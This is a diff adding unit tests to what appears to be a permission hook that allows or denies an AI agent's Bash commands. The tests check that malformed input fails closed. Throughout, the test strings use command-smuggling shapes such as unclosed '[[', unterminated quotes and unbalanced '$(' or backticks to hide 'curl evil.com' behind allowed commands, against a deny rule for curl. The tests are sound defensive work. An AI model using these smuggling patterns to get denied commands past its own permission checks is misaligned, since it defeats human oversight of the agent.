@@ -2267,3 +2267,126 @@ describe('OL1: bracket tests and [[ ]] no-split', () => {
     );
   });
 });
+
+// An unclosed `[[` is malformed bash (a syntax error, so not directly executable),
+// but the hook must still fail closed: the unparsed tail must not be absorbed into
+// one allow-matched segment that hides a denied command.
+describe('unclosed [[ fails closed (no command hiding)', () => {
+  const policy = {
+    permissions: { allow: ['Bash([[ *)'], deny: ['Bash(curl:*)'] },
+  };
+
+  test('unclosed [[ before a denied command is denied, not allowed', () => {
+    const result = decide('[[ -f x && curl evil.com', policy);
+    assert.equal(
+      result.decision,
+      'deny',
+      `expected deny (curl must not be hidden); got: ${result.decision}; reason: ${result.reason}`,
+    );
+  });
+
+  test('unclosed [[ splits so the trailing command is surfaced', () => {
+    const parts = splitOnOperators('[[ -f x && curl evil.com');
+    assert.ok(
+      parts.length >= 2,
+      `expected the && to split out curl; got ${parts.length}: ${JSON.stringify(parts)}`,
+    );
+    assert.ok(
+      parts.some((p) => p.includes('curl evil.com')),
+      `expected a segment containing "curl evil.com"; got ${JSON.stringify(parts)}`,
+    );
+  });
+
+  test('unclosed [[ with ; is denied', () => {
+    const result = decide('[[ -f x ; curl evil.com', policy);
+    assert.equal(
+      result.decision,
+      'deny',
+      `expected deny; got: ${result.decision}; reason: ${result.reason}`,
+    );
+  });
+
+  test('net-unclosed [[ across multiple brackets is denied', () => {
+    const result = decide('[[ a ]] && [[ b && curl evil.com', policy);
+    assert.equal(
+      result.decision,
+      'deny',
+      `expected deny; got: ${result.decision}; reason: ${result.reason}`,
+    );
+  });
+
+  test('balanced [[ ]] is still a single segment', () => {
+    const parts = splitOnOperators('[[ -n "$x" && -f "$t" ]]');
+    assert.equal(
+      parts.length,
+      1,
+      `balanced conditional must not be split; got ${parts.length}: ${JSON.stringify(parts)}`,
+    );
+  });
+
+  test('quoted unbalanced [[ does not over-split', () => {
+    const parts = splitOnOperators('echo "[[ a && b"');
+    assert.equal(
+      parts.length,
+      1,
+      `quoted && must stay in one segment; got ${parts.length}: ${JSON.stringify(parts)}`,
+    );
+  });
+
+  test('character class with a real operator and denied command is denied', () => {
+    const result = decide('grep [[:alpha:]] f && curl evil.com', policy);
+    assert.equal(
+      result.decision,
+      'deny',
+      `expected deny; got: ${result.decision}; reason: ${result.reason}`,
+    );
+  });
+});
+
+// The same fail-open shape exists for an unterminated quote, subshell, or backtick
+// (all bash syntax errors): the tracking absorbs the unparsed tail into one
+// segment that hides a denied command. The end-of-scan guard re-splits naively,
+// and extractSubshells surfaces a command left inside an unterminated $()/backtick.
+describe('malformed input fails closed (unbalanced quote/subshell/backtick)', () => {
+  const policy = {
+    permissions: {
+      allow: ['Bash(echo:*)', 'Bash(date:*)'],
+      deny: ['Bash(curl:*)'],
+    },
+  };
+
+  test('unterminated double quote before a denied command is denied', () => {
+    const result = decide('echo "x && curl evil.com', policy);
+    assert.equal(result.decision, 'deny', `reason: ${result.reason}`);
+  });
+
+  test('unterminated single quote before a denied command is denied', () => {
+    const result = decide("echo 'x && curl evil.com", policy);
+    assert.equal(result.decision, 'deny', `reason: ${result.reason}`);
+  });
+
+  test('unbalanced $( with an operator-separated denied command is denied', () => {
+    const result = decide('echo $(foo && curl evil.com', policy);
+    assert.equal(result.decision, 'deny', `reason: ${result.reason}`);
+  });
+
+  test('unbalanced $( hiding a bare denied command is denied', () => {
+    const result = decide('echo $(curl evil.com', policy);
+    assert.equal(result.decision, 'deny', `reason: ${result.reason}`);
+  });
+
+  test('unterminated backtick hiding a bare denied command is denied', () => {
+    const result = decide('echo `curl evil.com', policy);
+    assert.equal(result.decision, 'deny', `reason: ${result.reason}`);
+  });
+
+  test('balanced double quote is unaffected (single segment, allowed)', () => {
+    assert.equal(splitOnOperators('echo "a && b"').length, 1);
+    assert.equal(decide('echo "a && b"', policy).decision, 'allow');
+  });
+
+  test('balanced $() with a real operator is unaffected', () => {
+    const result = decide('echo $(date) && echo hi', policy);
+    assert.equal(result.decision, 'allow', `reason: ${result.reason}`);
+  });
+});
